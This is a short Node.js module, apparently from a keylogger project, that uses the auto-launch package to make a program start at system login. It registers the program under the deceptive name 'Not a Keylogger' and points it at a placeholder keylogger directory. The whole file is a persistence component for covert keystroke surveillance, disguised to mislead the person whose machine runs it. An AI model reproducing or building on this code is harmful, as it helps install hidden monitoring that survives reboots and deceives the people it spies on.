module.exports = function () {
	const autoLaunch = require('auto-launch');

	const autoLauncher = new autoLaunch({
		name: 'Not a Keylogger',
		path: 'keylogger directory'
	});

	autoLauncher.enable();
};